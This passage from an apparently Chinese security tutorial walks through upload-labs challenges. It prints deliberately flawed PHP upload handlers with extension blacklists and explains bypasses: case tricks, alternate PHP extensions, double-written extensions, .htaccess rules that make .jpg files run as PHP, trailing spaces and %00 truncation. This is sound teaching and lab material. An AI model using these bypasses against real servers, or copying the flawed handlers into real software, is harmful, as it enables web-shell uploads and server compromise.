            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>通过源代码我们可以发现，黑名单里虽然过滤的很全面，但是在下面的后缀名处理之中却出现了纰漏，没有将后缀名转换为小写。</li></ul>
<pre><code class="prism language-php"><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
</code></pre>
<ul><li>这样的话，我们就可以进行大小写绕过了。首先来说，直接上传后缀名为<code>.pHP</code>的文件成功。</li></ul>
<hr/>
<h4><a id="342__538"></a>3.4.2 修改后缀名绕过?</h4>
<ul><li>源码分析</li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.asp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.aspx'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件</li><li>但可以上传<code>.phtml .phps .php5 .pht</code></li><li>前提是apache的httpd.conf中有如下配置代码</li></ul>
<pre><code class="prism language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>php <span class="token punctuation">.</span>phtml <span class="token punctuation">.</span>phps <span class="token punctuation">.</span>php5 <span class="token punctuation">.</span>pht
</code></pre>
<ul><li>当我们修改文件后缀名之后，可以发现到文件正常上传成功。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518175610585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>我们从<code>RAW</code>包中可以查找到文件上传的位置。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518175730510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>我们可以在浏览器中进行构建URL（就是构建一下访问地址）进行访问。</li><li><strong>构建的URL：</strong><code>http://127.0.0.1/upload/upload/202105181219104196.php5</code></li><li><strong>URL模板：</strong> <code>http://127.0.0.1/upload/文件上传路径</code></li><li><code>该URL模板只适用该案例</code></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518202256816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<hr/>
<h4><a id="343__594"></a>3.4.3 重写绕过</h4>
<ul><li>服务端将<code>黑名单的后缀名替换为空，但仅进行一次</code>。上传.phphpp后缀，替换php一次为空，则后缀</li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


</code></pre>
<h4><a id="344__623"></a>3.4.4 特殊可解析后缀绕过</h4>
<ul><li><code>黑名单规则不严谨</code>，在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。phplphp2/php3/php4lphp5/php6lphp7/phtlphtm/phtml</li><li>基于debian和ubuntu的apt-get安装apache，默认对于文件的解析规则如下。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518204312610.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518204330898.png"/></p>
<h4><a id="345_htaccess_629"></a>3.4.5 .htaccess绕过</h4>
<ul><li>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，<code>可以通过设置可以将该目录下的所有文件作为php文件来解析</code></li><li><code>.htaccess</code>可以写入apache配置信息，改变当前目录以及子目录的Apache配置信息。</li><li><strong>前提条件：</strong> 配置上允许.htaccess生效<br/> Apache开启rewrite模块<br/> .apache配置文件为AllowOverride All(默认为None)</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518205240431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>方法一：</strong> 所有jpg后祭都会背当做PHP解析</li></ul>
<pre><code class="prism language-php"> <span class="token operator">-</span> AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token punctuation">.</span>jpg
</code></pre>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518211319835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>方法二：</strong> 带有jpg关键字会被当岗PHP解析</li></ul>
<pre><code class="prism language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token double-quoted-string string">"sec.jpg"</span><span class="token operator">&gt;</span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span>
</code></pre>
<h4><a id="346_windos_652"></a>3.4.6 利用操作系统特性-windos</h4>
<ul><li>利用<code>window对于文件和文件名的限制</code>，以下字符放在结尾时，不符合操作系统的命名规范,在最后生成文件时，<code>字符会被自动去除</code>。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518214952407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>源码分析：</strong></li><li><strong>第一种：</strong> <code>对应upland第6题</code></li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<ul><li><strong>这题没有对后缀名进行去空，因此可以在后缀名加空格绕过</strong></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518215322209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="347_00_694"></a>3.4.7 %00截断</h4>
<ul><li>%00是chr(O)，<code>它不是空格，是NULL，空字符</code>。</li><li>当程序在输出含有chr(O)变量时，chr(O)后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</li><li>在文件上传中，利用%00截断，<code>在文件扩展名验证时，是取文件的扩展名来做验证</code>，但是最后文件保存在本地时，<code>%00会截断文件名，只保存%00之前的内容</code>。</li><li><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</li><li><strong>源码分析：</strong></li><li><strong>第一种：</strong> <code>对应upland第11题</code></li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
